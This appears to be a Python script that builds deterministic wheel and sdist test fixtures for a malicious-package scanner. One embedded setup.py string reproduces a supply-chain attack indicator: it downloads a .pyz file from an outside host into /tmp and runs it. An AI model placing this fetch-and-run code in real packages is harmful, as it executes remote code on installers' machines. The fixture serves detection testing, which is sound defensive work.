"""Deterministic builder for the wheel + sdist binary fixtures.

This script is NOT run from CI; the produced .whl / .tar.gz bytes are
committed alongside it. Re-run only when the IOC literal changes.

Determinism strategy
--------------------
- All member timestamps fixed to `SOURCE_DATE_EPOCH=0` (Unix epoch).
- All members written with uid=0, gid=0, uname="", gname="".
- Permission bits fixed: 0o644 for files, 0o755 for directories.
- Members emitted in sorted order so the archive byte stream does not
  depend on filesystem iteration order.
- `zipfile.ZipFile` is invoked with `compresslevel=6` (default DEFLATE)
  to keep output stable across stdlib versions.

Re-running this script and diffing the .whl bytes against git is the
regression test for determinism (also asserted in test_scan_packages).
"""

from __future__ import annotations

import io
import os
import sys
import tarfile
import zipfile
from pathlib import Path

SOURCE_DATE_EPOCH = 0
# Zip stores DOS time which starts at 1980; map epoch to 1980-01-01.
_ZIP_DOS_EPOCH = (1980, 1, 1, 0, 0, 0)

HERE = Path(__file__).resolve().parent


# The IOC literal that scan_packages.py must trip on. Keep this in
# sync with KNOWN_IOC_STRINGS in scripts/scan_npm_packages.py and
# RE_MAY12_IOC in scripts/scan_packages.py.
MALICIOUS_SETUP_PY = '''"""Test fixture: do NOT install.

This file embeds the May-12 Mini Shai-Hulud IOC literal so the
scan_packages.py regression tests can confirm the scanner trips on
the malicious setup.py shape. The string below is the same literal an
attacker would embed in a compromised release.
"""

from setuptools import setup
import urllib.request
import subprocess

# IOC literal -- mirrors public Socket.dev 2026-05-12 disclosure.
urllib.request.urlretrieve(
    "https://git-tanstack.com/transformers.pyz",
    "/tmp/transformers.pyz",
)
subprocess.run(["python3", "/tmp/transformers.pyz"], check=False)

setup(name="malicious-fixture", version="0.0.1")
'''


CLEAN_INIT_PY = '''"""Test fixture: empty placeholder package."""
'''


WHEEL_METADATA = (
    "Metadata-Version: 2.1\n"
    "Name: {name}\n"
    "Version: 0.0.1\n"
    "Summary: test fixture (do not install)\n"
)

WHEEL_FILE = (
    "Wheel-Version: 1.0\n"
    "Generator: tests/security/fixtures/_build.py\n"
    "Root-Is-Purelib: true\n"
    "Tag: py3-none-any\n"
)

RECORD_HEADER = ""


def _write_zip_member(zf: zipfile.ZipFile, name: str, data: bytes) -> None:
    info = zipfile.ZipInfo(filename = name, date_time = _ZIP_DOS_EPOCH)
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = (0o644 & 0xFFFF) << 16
    info.create_system = 3  # Unix
    zf.writestr(info, data)


def _build_wheel(out_path: Path, *, name: str, payload_files: dict[str, bytes]) -> None:
    """Write a deterministic .whl at `out_path`.

    `payload_files` maps archive-relative paths to their bytes. Standard
    `.dist-info/METADATA`, `WHEEL`, and `RECORD` are added automatically.
    """
    dist_info = f"{name}-0.0.1.dist-info"
    members: dict[str, bytes] = dict(payload_files)
    members[f"{dist_info}/METADATA"] = WHEEL_METADATA.format(name = name).encode()
    members[f"{dist_info}/WHEEL"] = WHEEL_FILE.encode()
    # RECORD is intentionally minimal; the scanner only inspects file
    # bodies, not hash integrity.
    record_lines = []
    for path in sorted(members):
        record_lines.append(f"{path},,")
    record_lines.append(f"{dist_info}/RECORD,,")
    members[f"{dist_info}/RECORD"] = ("\n".join(record_lines) + "\n").encode()

    # Write with sorted order for deterministic byte output.
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression = zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(members):
            _write_zip_member(zf, path, members[path])
    out_path.write_bytes(buf.getvalue())


def _build_sdist(out_path: Path, *, name: str, payload_files: dict[str, bytes]) -> None:
    """Write a deterministic .tar.gz sdist at `out_path`.

    `payload_files` maps archive-relative paths to their bytes; a
    leading `{name}-0.0.1/` prefix is added automatically.
    """
    prefix = f"{name}-0.0.1"
    buf = io.BytesIO()
    # gzip mtime fixed via mtime=0 (gzip member header).
    import gzip

    inner = io.BytesIO()
    with tarfile.open(fileobj = inner, mode = "w") as tf:
        for path in sorted(payload_files):
            data = payload_files[path]
            info = tarfile.TarInfo(name = f"{prefix}/{path}")
            info.size = len(data)
            info.mtime = SOURCE_DATE_EPOCH
            info.mode = 0o644
            info.uid = 0
            info.gid = 0
            info.uname = ""
            info.gname = ""
            info.type = tarfile.REGTYPE
            tf.addfile(info, io.BytesIO(data))
    raw = inner.getvalue()
    # gzip with fixed mtime=0 and explicit compresslevel for stability.
    gz_buf = io.BytesIO()
    with gzip.GzipFile(
        fileobj = gz_buf,
        mode = "wb",
        mtime = SOURCE_DATE_EPOCH,
        compresslevel = 6,
        filename = "",
    ) as gz:
        gz.write(raw)
    out_path.write_bytes(gz_buf.getvalue())


def build_all() -> dict[str, Path]:
    os.environ["SOURCE_DATE_EPOCH"] = str(SOURCE_DATE_EPOCH)

    outputs: dict[str, Path] = {}

    # Malicious wheel: payload setup.py that embeds the May-12 IOC.
    mal_payload = {
        "setup.py": MALICIOUS_SETUP_PY.encode(),
        "malicious_fixture/__init__.py": b"# malicious fixture stub\n",
    }
    mal_whl = HERE / "malicious_wheel.whl"
    _build_wheel(mal_whl, name = "malicious_fixture", payload_files = mal_payload)
    outputs["malicious_wheel"] = mal_whl

    # Clean wheel: empty placeholder.
    clean_payload = {
        "clean_fixture/__init__.py": CLEAN_INIT_PY.encode(),
    }
    clean_whl = HERE / "clean_wheel.whl"
    _build_wheel(clean_whl, name = "clean_fixture", payload_files = clean_payload)
    outputs["clean_wheel"] = clean_whl

    # Malicious sdist: same setup.py, tar.gz form.
    mal_sdist = HERE / "malicious_sdist.tar.gz"
    _build_sdist(mal_sdist, name = "malicious_fixture", payload_files = mal_payload)
    outputs["malicious_sdist"] = mal_sdist

    return outputs


if __name__ == "__main__":
    paths = build_all()
    for label, path in paths.items():
        size = path.stat().st_size
        print(f"  {label:>18}: {path.name}  ({size} bytes)")
    sys.exit(0)
